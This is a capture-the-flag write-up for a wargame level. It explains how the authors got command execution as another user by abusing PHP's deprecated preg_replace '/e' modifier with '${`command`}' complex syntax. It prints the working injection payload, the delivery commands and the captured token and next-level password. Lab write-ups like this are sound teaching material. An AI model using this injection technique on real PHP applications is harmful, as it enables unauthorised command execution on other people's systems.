With a `ls` on level06, we can see that we have two files.
One is a binary file and one is PhP file.
To begin, we start by using Ghidra on the binary file, and we understand that it is executing the PhP script.
Looking into this file, we witness the use of a deprecated method while using regex : `/e`.
This is deprecated because it can be use to execute command shell while executing the script, if we give the correct argument.
First thing, we tried to put in a file in the tmp directory :
"""
[x `getflag`]
"""
But this doesn't work, it just print "`getflag`".
So we thought it has to be because of the newline at the end of the file.
So we tried :
"""
echo -n "[x `whoami`]" > /tmp/text; ./level06 /tmp/text; echo ""
"""
This does execute `whoami` but the result is "level06" and not flag06. So we still have an isue.
After some testing, Guillaume found the `complex syntax`. And with that, we can execute a command during the script because PhP is interpreted.
In a file, still in the tmp directory, we put:
"""
[x ${`whoami`}]
"""
We have the result we want, we have "flag06".
SO by changing `whoami` by `getflag`, and by executing the binary file, the user `flag06` will execute the command `getflag`.
The result is :
"""
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
"""

To connect to level 7:
```
su level07
wiok45aaoguiboiki2tuin6ub
```
